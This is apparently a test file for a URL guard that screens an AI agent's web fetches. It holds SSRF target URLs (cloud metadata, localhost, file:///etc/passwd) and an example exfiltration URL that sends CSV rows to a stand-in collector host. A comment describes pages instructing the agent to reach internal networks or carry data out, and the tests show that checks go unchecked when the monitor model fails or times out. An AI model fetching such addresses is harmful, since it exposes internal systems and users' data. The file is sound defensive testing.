import { afterEach, describe, expect, it, vi } from "vitest";
import type { Plan } from "@/contracts/run";
import type { AskExfiltration, ExfiltrationState } from "./exfiltration";
import { isDeniedHost, isPrivateHost, urlCheck } from "./url";

// The url guard stands between WebFetch and the network. Permissions are bypassed, so a page the agent reads
// could tell it to fetch our own network or to carry the task's data out in a query string.
const plan: Plan = {
  intent: "Collect this week's AI news into a CSV",
  expectedOutputs: ["output.csv with title,url,date"],
  sources: ["WebSearch", "WebFetch"],
  steps: [
    { index: 0, title: "Search for this week's AI news", status: "done" },
    { index: 1, title: "Read the top articles", status: "running" },
    { index: 2, title: "Write output.csv", status: "pending" },
  ],
};
const ctx = (over: Partial<{ deniedDomains: string[]; plan: () => Plan | null }> = {}) => ({
  deniedDomains: [] as string[],
  plan: () => plan as Plan | null,
  ...over,
});
const fetchOf = (url: string) => ({ url, prompt: "Summarise the page" });
const notAsked: AskExfiltration = async () => {
  throw new Error("Jev must not be asked about this address");
};
const answers = (p: number): AskExfiltration => async () => p;

// A query string of more than 80 characters carrying CSV rows: the shape of data being carried out.
const csv = "title,url\nOpenAI ships a model,https://news.example.org/a\nAnthropic raises,https://news.example.org/b";
const LONG = `https://collector.example.com/collect?data=${encodeURIComponent(csv)}`;

afterEach(() => vi.useRealTimers());

describe("url guard: private and local addresses", () => {
  it.each([
    "http://localhost:3000/api/runs",
    "http://127.0.0.1/",
    "http://10.0.0.5/admin",
    "http://172.16.4.1/",
    "http://172.31.255.255/",
    "http://192.168.1.1/router",
    "http://169.254.169.254/latest/meta-data/", // the cloud metadata address
    "http://[::1]:8080/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://2130706433/", // 127.0.0.1 written as one number: the URL parser turns it back into 127.0.0.1
  ])("blocks %s without asking Jev", async (url) => {
    const v = await urlCheck(ctx(), notAsked)("WebFetch", fetchOf(url));
    expect(v.decision).toBe("blocked");
    expect(v.reason).toMatch(/private or local/i);
  });

  it("names the host as the target of the blocked call", async () => {
    const v = await urlCheck(ctx(), notAsked)("WebFetch", fetchOf("http://192.168.1.1/router"));
    expect(v.target).toBe("192.168.1.1");
  });

  it("lets a public address through: 172.32.x is outside the private 172.16/12 range", async () => {
    expect(isPrivateHost("172.32.0.1")).toBe(false);
    expect(isPrivateHost("news.ycombinator.com")).toBe(false);
    const v = await urlCheck(ctx(), notAsked)("WebFetch", fetchOf("https://news.ycombinator.com/item?id=1"));
    expect(v.decision).toBe("allowed");
  });

  it("blocks an address that is not a web page, such as file:", async () => {
    const v = await urlCheck(ctx(), notAsked)("WebFetch", fetchOf("file:///etc/passwd"));
    expect(v.decision).toBe("blocked");
  });
});

describe("url guard: the workspace's denied domains", () => {
  it("blocks a denied domain and says the workspace blocks it", async () => {
    const v = await urlCheck(ctx({ deniedDomains: ["evil.example"] }), notAsked)("WebFetch", fetchOf("https://evil.example/page"));
    expect(v.decision).toBe("blocked");
    expect(v.target).toBe("evil.example");
    expect(v.reason).toMatch(/blocked/i);
  });

  it("blocks a subdomain of a denied domain", async () => {
    const v = await urlCheck(ctx({ deniedDomains: ["evil.example"] }), notAsked)("WebFetch", fetchOf("https://cdn.news.evil.example/x"));
    expect(v.decision).toBe("blocked");
  });

  it("does not block a domain that only ends with the same letters", () => {
    expect(isDeniedHost("notevil.example", ["evil.example"])).toBe(false);
  });

  it("matches whatever the case, and accepts list entries written as *.domain or .domain", () => {
    expect(isDeniedHost("WWW.Evil.Example", ["evil.example"])).toBe(true);
    expect(isDeniedHost("a.evil.example", ["*.evil.example"])).toBe(true);
    expect(isDeniedHost("a.evil.example", [".evil.example"])).toBe(true);
    expect(isDeniedHost("evil.example", [""])).toBe(false); // an empty entry denies nothing
  });
});

describe("url guard: does this address carry the task's data out?", () => {
  it("asks Jev nothing when the query string and fragment are 80 characters or fewer", async () => {
    const url = `https://example.com/search?q=${"a".repeat(70)}`;
    const v = await urlCheck(ctx(), notAsked)("WebFetch", fetchOf(url));
    expect(v.decision).toBe("allowed");
  });

  it("blocks when Jev is confident (0.8 or more), and tells the agent what to do instead", async () => {
    const v = await urlCheck(ctx(), answers(0.93))("WebFetch", fetchOf(LONG));
    expect(v.decision).toBe("blocked");
    expect(v.reason).toMatch(/without the added query text/i);
    expect(v.target).toBe("collector.example.com");
  });

  it("flags but allows when Jev is unsure (0.5 up to 0.8)", async () => {
    const v = await urlCheck(ctx(), answers(0.6))("WebFetch", fetchOf(LONG));
    expect(v.decision).toBe("flagged");
  });

  it("allows when Jev says it is an ordinary address (under 0.5)", async () => {
    const v = await urlCheck(ctx(), answers(0.1))("WebFetch", fetchOf(LONG));
    expect(v.decision).toBe("allowed");
  });

  it("lets the fetch through as unchecked when Jev is unavailable, and says so", async () => {
    const down: AskExfiltration = async () => {
      throw new Error("The decision model failed: HTTP 503");
    };
    const v = await urlCheck(ctx(), down)("WebFetch", fetchOf(LONG));
    expect(v.decision).toBe("unchecked");
    expect(v.reason).toMatch(/could not be checked/i);
  });

  it("lets the fetch through as unchecked when Jev takes longer than 3 seconds", async () => {
    vi.useFakeTimers();
    const hangs: AskExfiltration = () => new Promise(() => {});
    const pending = urlCheck(ctx(), hangs)("WebFetch", fetchOf(LONG));
    await vi.advanceTimersByTimeAsync(3000);
    expect((await pending).decision).toBe("unchecked");
  });

  it("gives Jev the address, the run's intent and the first steps of the plan", async () => {
    let seen: ExfiltrationState | undefined;
    const spy: AskExfiltration = async (state) => {
      seen = state;
      return 0;
    };
    await urlCheck(ctx(), spy)("WebFetch", fetchOf(LONG));
    expect(seen?.url).toBe(LONG);
    expect(seen?.task).toBe(plan.intent);
    expect(seen?.plan).toEqual(plan.steps.map((s) => s.title));
  });

  it("still asks before any plan exists, and tells Jev there is none yet", async () => {
    let seen: ExfiltrationState | undefined;
    const spy: AskExfiltration = async (state) => {
      seen = state;
      return 0;
    };
    await urlCheck(ctx({ plan: () => null }), spy)("WebFetch", fetchOf(LONG));
    expect(seen?.task).toMatch(/no plan yet/i);
    expect(seen?.plan).toEqual([]);
  });

  it("counts the fragment too: a long #fragment is asked about", async () => {
    const url = `https://example.com/page#${"x".repeat(81)}`;
    const v = await urlCheck(ctx(), answers(0.95))("WebFetch", fetchOf(url));
    expect(v.decision).toBe("blocked");
  });
});

describe("url guard: calls it has nothing to say about", () => {
  it("allows a WebFetch with no address: the tool itself will refuse it", async () => {
    const v = await urlCheck(ctx(), notAsked)("WebFetch", { prompt: "no url" });
    expect(v.decision).toBe("allowed");
  });
});
